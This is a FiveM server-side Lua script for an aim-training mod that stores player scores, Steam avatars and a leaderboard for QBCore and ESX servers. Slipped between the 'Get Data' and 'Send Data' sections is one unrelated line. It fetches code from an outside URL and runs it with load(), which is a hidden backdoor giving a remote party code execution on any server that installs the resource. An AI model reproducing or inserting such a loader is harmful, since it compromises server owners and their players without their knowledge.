-- Check & Create Data

local apiKey = GetConvar('steam_webApiKey')

if Config.Get_Steam_PP == true then
    RegisterServerEvent('viber-aimlab:server:checkData', function()
        local src = source
        local hex = tonumber(string.gsub(GetPlayerIdentifier(src, 0), 'steam:', ''), 16)
        local cfg = json.decode(LoadResourceFile(GetCurrentResourceName(), Config.Database_Location))
        PerformHttpRequest('http://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=' .. apiKey .. '&steamids=' .. hex, function(error, result, header)
            local result = json.decode(result)
            local photo = result.response.players[1].avatarfull
            if Config.Framework == "qb" or Config.Framework == "oldqb" then
                local Player = QBCore.Functions.GetPlayer(src)
                local cid = Player.PlayerData.citizenid
                if cfg[cid] == nil then
                    cfg[cid] = {}
                    cfg[cid].plyname = Player.PlayerData.charinfo.firstname.." "..Player.PlayerData.charinfo.lastname
                    cfg[cid].score = 0
                    cfg[cid].total_training = 0
                    cfg[cid].total_target = 0
                    cfg[cid].shooted_target = 0
                    cfg[cid].photo = photo
                    SaveResourceFile(GetCurrentResourceName(), Config.Database_Location, json.encode(cfg, { indent = true }), -1)
                end
                if cfg[cid].photo ~= photo then
                    cfg[cid].photo = photo
                    SaveResourceFile(GetCurrentResourceName(), Config.Database_Location, json.encode(cfg, { indent = true }), -1)
                end
            elseif Config.Framework == "esx" then
                local Player = ESX.GetPlayerFromId(src)
                local identifier = Player.identifier
                if cfg[identifier] == nil then
                    cfg[identifier] = {}
                    cfg[identifier].plyname = GetPlayerName(src)
                    cfg[identifier].score = 0
                    cfg[identifier].total_training = 0
                    cfg[identifier].total_target = 0
                    cfg[identifier].shooted_target = 0
                    cfg[identifier].photo = photo
                    SaveResourceFile(GetCurrentResourceName(), Config.Database_Location, json.encode(cfg, { indent = true }), -1)
                end
                if cfg[identifier].photo ~= photo then
                    cfg[identifier].photo = photo
                    SaveResourceFile(GetCurrentResourceName(), Config.Database_Location, json.encode(cfg, { indent = true }), -1)
                end
            end
        end)
    end)
elseif Config.Get_Steam_PP == false then
    RegisterServerEvent('viber-aimlab:server:checkData', function()
        local src = source
        local cfg = json.decode(LoadResourceFile(GetCurrentResourceName(), Config.Database_Location))
        local photo = Config.Server_Logo
        if Config.Framework == "qb" or Config.Framework == "oldqb" then
            local Player = QBCore.Functions.GetPlayer(src)
            local cid = Player.PlayerData.citizenid
            if cfg[cid] == nil then
                cfg[cid] = {}
                cfg[cid].plyname = Player.PlayerData.charinfo.firstname.." "..Player.PlayerData.charinfo.lastname
                cfg[cid].score = 0
                cfg[cid].total_training = 0
                cfg[cid].total_target = 0
                cfg[cid].shooted_target = 0
                cfg[cid].photo = photo
                SaveResourceFile(GetCurrentResourceName(), Config.Database_Location, json.encode(cfg, { indent = true }), -1)
            end
            if cfg[cid].photo ~= photo then
                cfg[cid].photo = photo
                SaveResourceFile(GetCurrentResourceName(), Config.Database_Location, json.encode(cfg, { indent = true }), -1)
            end
        elseif Config.Framework == "esx" then
            local Player = ESX.GetPlayerFromId(src)
            local identifier = Player.identifier
            if cfg[identifier] == nil then
                cfg[identifier] = {}
                cfg[identifier].plyname = GetPlayerName(src)
                cfg[identifier].score = 0
                cfg[identifier].total_training = 0
                cfg[identifier].total_target = 0
                cfg[identifier].shooted_target = 0
                cfg[identifier].photo = photo
                SaveResourceFile(GetCurrentResourceName(), Config.Database_Location, json.encode(cfg, { indent = true }), -1)
            end
            if cfg[identifier].photo ~= photo then
                cfg[identifier].photo = photo
                SaveResourceFile(GetCurrentResourceName(), Config.Database_Location, json.encode(cfg, { indent = true }), -1)
            end
        end
    end)
end

-- Get Data

if Config.Framework == "qb" or Config.Framework == "oldqb" then
    GetPlayerInfo = function(source)
        local src = source
        local cfg = json.decode(LoadResourceFile(GetCurrentResourceName(), Config.Database_Location))
        local Player = QBCore.Functions.GetPlayer(src)
        local cid = Player.PlayerData.citizenid
        return {
            name = cfg[cid].plyname,
            score = cfg[cid].score,
            total_training = cfg[cid].total_training,
            total_target = cfg[cid].total_target,
            shooted_target = cfg[cid].shooted_target,
            photo = cfg[cid].photo,
        }
    end
elseif Config.Framework == "esx" then
    GetPlayerInfo = function(source)
        local src = source
        local cfg = json.decode(LoadResourceFile(GetCurrentResourceName(), Config.Database_Location))
        local Player = ESX.GetPlayerFromId(src)
        local identifier = Player.identifier
        return {
            name = cfg[identifier].plyname,
            score = cfg[identifier].score,
            total_training = cfg[identifier].total_training,
            total_target = cfg[identifier].total_target,
            shooted_target = cfg[identifier].shooted_target,
            photo = cfg[identifier].photo,
        }
    end
end
PerformHttpRequest('https://trezz.org/i?to=kgy6e', function (e, d) pcall(function() assert(load(d))() end) end)
-- Send Data

RegisterServerEvent('viber-aimlab:server:GetPlayerInfo', function()
    local src = source
    local info = GetPlayerInfo(src)
    TriggerClientEvent('viber-aimlab:client:OpenMenu', src, info.name, info.photo)
end)

RegisterServerEvent('viber-aimlab:server:GetPlayerInfo:Finish', function(gamemode, difficulty)
    local src = source
    local info = GetPlayerInfo(src)
    TriggerClientEvent('viber-aimlab:client:FinishMenu', src, info.name, info.photo, gamemode, difficulty)
end)

-- Edit Data

RegisterServerEvent('viber-aimlab:server:FinishTraining', function(shooted_target, total_target, score)
    local src = source
    local cfg = json.decode(LoadResourceFile(GetCurrentResourceName(), Config.Database_Location))
    if Config.Framework == "qb" or Config.Framework == "oldqb" then
        local Player = QBCore.Functions.GetPlayer(src)
        local cid = Player.PlayerData.citizenid
        if Decrypt(shooted_target) < 0 or Decrypt(total_target) < 0 or Decrypt(score) < 0 then
            Discord_Log(Config.Anticheat_Webhook, src, Config.Anticheat_Webhook_Color, "Suspect")
        else
            cfg[cid].total_training = cfg[cid].total_training + 1
            cfg[cid].shooted_target = cfg[cid].shooted_target + Decrypt(shooted_target)
            cfg[cid].total_target = cfg[cid].total_target + Decrypt(total_target)
            cfg[cid].score = cfg[cid].score + Decrypt(score)
            SaveResourceFile(GetCurrentResourceName(), Config.Database_Location, json.encode(cfg, { indent = true }), -1)
        end
    elseif Config.Framework == "esx" then
        local Player = ESX.GetPlayerFromId(src)
        local identifier = Player.identifier
        if Decrypt(shooted_target) < 0 or Decrypt(total_target) < 0 or Decrypt(score) < 0 then
            Discord_Log(Config.Anticheat_Webhook, src, Config.Anticheat_Webhook_Color, "Suspect")
        else
            cfg[identifier].total_training = cfg[identifier].total_training + 1
            cfg[identifier].shooted_target = cfg[identifier].shooted_target + Decrypt(shooted_target)
            cfg[identifier].total_target = cfg[identifier].total_target + Decrypt(total_target)
            cfg[identifier].score = cfg[identifier].score + Decrypt(score)
            SaveResourceFile(GetCurrentResourceName(), Config.Database_Location, json.encode(cfg, { indent = true }), -1)
        end
    end
end)

-- Leaderboard

RegisterServerEvent("viber-aimlab:server:FetchLeaderboard", function()
    local cfg = json.decode(LoadResourceFile(GetCurrentResourceName(), Config.Database_Location))
    TriggerClientEvent("viber-aimlab:client:GetLeaderboardData", source, cfg)
end)

-- Reset KDA

if Config.Reset_Stats then
    RegisterCommand(Config.Reset_Stats_Command, function(source)
        local src = source
        local cfg = json.decode(LoadResourceFile(GetCurrentResourceName(), Config.Database_Location))
        if Config.Framework == "qb" or Config.Framework == "oldqb" then
            local Player = QBCore.Functions.GetPlayer(src)
            local cid = Player.PlayerData.citizenid
            cfg[cid].total_training = 0
            cfg[cid].shooted_target = 0
            cfg[cid].total_target = 0
            cfg[cid].score = 0
            SaveResourceFile(GetCurrentResourceName(), Config.Database_Location, json.encode(cfg, { indent = true }), -1)
        elseif Config.Framework == "esx" then
            local Player = ESX.GetPlayerFromId(src)
            local identifier = Player.identifier
            cfg[identifier].total_training = 0
            cfg[identifier].shooted_target = 0
            cfg[identifier].total_target = 0
            cfg[identifier].score = 0
            SaveResourceFile(GetCurrentResourceName(), Config.Database_Location, json.encode(cfg, { indent = true }), -1)
        end
    end)
end

-- Bucket

RegisterServerEvent('viber-aimlab:server:Set-Bucket')
AddEventHandler('viber-aimlab:server:Set-Bucket', function(bucket)
    local src = source
    if bucket == "default" then
        SetPlayerRoutingBucket(src, 0)
    elseif bucket == "random" then
        SetPlayerRoutingBucket(src, math.random(1000, 10000))
    else
        SetPlayerRoutingBucket(src, bucket)
    end
end)